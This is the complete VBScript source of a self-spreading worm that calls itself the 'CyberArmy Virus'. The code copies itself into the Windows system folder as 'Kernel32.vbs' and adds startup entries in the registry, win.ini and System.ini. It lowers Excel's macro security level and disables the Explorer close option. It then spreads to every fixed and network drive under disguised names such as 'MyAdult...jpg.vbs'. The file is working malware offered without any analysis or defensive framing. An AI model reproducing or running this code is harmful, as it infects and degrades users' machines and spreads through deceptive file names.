'CyberArmy Virus by Major Grey ;)
On Error resume next
dim wobj
set ff = createobject("Scripting.FileSystemObject")
sfold = ff.getspecialfolder(1)
Set Fso= Createobject("scripting.filesystemobject")
Fso.copyfile wscript.scriptfullname,Fso.GetSpecialFolder(1)& "\Kernel32.vbs"
set wobj=wscript.createobject("WScript.Shell")
If Minute(Now)>55 Then
nbr = weekday(now)
if nbr > 3 then nbr = nbr - 3
Wobj.regwrite"HKLM\system\currentcontrolset\services\Vxd\Vnetsup\Workgroup","Army" & nbr
msgbox" Haii....CyberARMY now protect your PC "
wobj.regwrite"HKCU\Software\Microsoft\Windos\CurrentVersion\Policies\Explorer\NoClose","1"
End If
wobj.regwrite"HKCU\Software\Microsoft\Office\9.0\Excel\Security\Level","1"
Wobj.regwrite"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Army","wscript.exe "&Fso.GetSpecialFolder(1)& "\kernel32.vbs %"
editini sfold&"\win.ini","[windows]","load",sfold&"\kernel32.vbs"
editini sfold&"\System.ini","[boot]","shell","Explorer.exe"& sfold&"\kernel32.vbs"
ntwrk()
sub cpdrv(drive)
on error resume next
Set s = createobject("Scripting.FileSystemObject")
set f=s.getfile(Wscript.scriptFullName)
nmfile = minute(now)
Scfile = second(now)
f.copy("c:\windows\desktop\" & "ISO9" & Scfile & nmfile & ".exe.vbs")
f.copy(drive & "\MyAdult" & nmfile & ".jpg.vbs")
ff.copyfile "C:\Army.xls",drive & "\Army.xls",True
end sub
function showdrive(drvpath)
on error resume next
dim fso,d,t
set fso = CreateObject("Scripting.FileSystemObject")
Set  d= fso.getdrive(drvpath)
select case d.drivetype
case 0:t="Unknown"
case 1:t="removable"
case 2:t="Fixed"
case 3:t="network"
case 4:t="CD-ROM"
case 5:t="Ramdisk"
end select
if t="" then t="none"
showdrive = t
end function
sub ntwrk()
on error resume next
for n=65 to 90
l=chr(n)
drv=l&":"
d3=showdrive(drv)
if d3="Fixed"then cpdrv(drv)
if d3="network" then cpdrv(drv)
next
end sub
